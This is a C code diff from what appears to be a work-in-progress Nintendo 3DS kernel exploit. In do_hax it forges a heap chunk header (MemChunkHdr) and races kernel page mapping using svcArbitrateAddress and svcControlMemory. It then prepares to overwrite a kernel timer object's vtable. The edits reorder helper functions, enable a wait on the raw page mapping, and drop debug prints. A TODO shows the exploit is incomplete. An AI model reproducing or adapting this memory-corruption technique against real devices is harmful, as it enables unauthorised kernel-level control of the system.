@@ -3,8 +3,6 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <malloc.h>
-#include <string.h>
-#include <3ds/svc.h>
 
 #define PAGE_SIZE 0x1000
 
@@ -76,20 +74,21 @@ static void begin_map_pages(u32 memAddr, u32 memSize) {
     threadCreate(allocate_thread, memInfo, 0x4000, 0x3F, 1, true);
 }
 
-static void wait_raw_mapped(u32 memAddr) {
-    // Retrieve arbiter.
-    Handle arbiter = __sync_get_arbiter();
-
-    // Use svcArbitrateAddress to detect when the memory page has been mapped.
-    while((u32) svcArbitrateAddress(arbiter, memAddr, ARBITRATION_WAIT_IF_LESS_THAN_TIMEOUT, 0, 0) == 0xD9001814);
-}
-
 // Waits for the memory mapping thread to complete.
 static void wait_map_complete() {
     // Wait for the control result to be set.
     while(control_res == -1) {
         svcSleepThread(1000000);
     }
+}
+
+// Waits for a raw page to be mapped.
+static void wait_raw_mapped(u32 memAddr) {
+    // Retrieve arbiter.
+    Handle arbiter = __sync_get_arbiter();
+
+    // Use svcArbitrateAddress to detect when the memory page has been mapped.
+    while((u32) svcArbitrateAddress(arbiter, memAddr, ARBITRATION_WAIT_IF_LESS_THAN_TIMEOUT, 0, 0) == 0xD9001814);
 }
 
 // Creates a timer and outputs its kernel object address (at ref count, not vtable pointer) from r2.
@@ -159,7 +158,7 @@ void do_hax() {
     ((MemChunkHdr*) memAddr)->next = fakeHdr;
 
     // Back up the kernel page before it is cleared.
-    //wait_raw_mapped(memAddr + PAGE_SIZE);
+    wait_raw_mapped(memAddr + PAGE_SIZE);
     //memcpy(backup, (void*) (memAddr + PAGE_SIZE), PAGE_SIZE);
 
     // Debug output.
@@ -168,20 +167,14 @@ void do_hax() {
     // Wait for memory mapping to complete.
     wait_map_complete();
 
-    // Free the isolating page, as we don't need it anymore.
-    svcControlMemory(&tmp, memAddr + memSize + PAGE_SIZE, 0, PAGE_SIZE, MEMOP_FREE, MEMPERM_DONTCARE);
-
     // Restore the kernel page backup.
     //memcpy((void*) (memAddr + PAGE_SIZE), backup, PAGE_SIZE);
 
     // Debug output.
     printf("Final control result: 0x%08X\n", (int) control_res);
 
-    int val = *(int*) (memAddr + PAGE_SIZE);
-
-    // Debug output.
-    printf("Hello world!\n");
-    printf("Val: %08X\n", val);
+    // Free the isolating page, as we don't need it anymore.
+    svcControlMemory(&tmp, memAddr + memSize + PAGE_SIZE, 0, PAGE_SIZE, MEMOP_FREE, MEMPERM_DONTCARE);
 
     // Overwrite the timer's vtable with our own.
     // TODO: This needs to be a kernel virtual address.
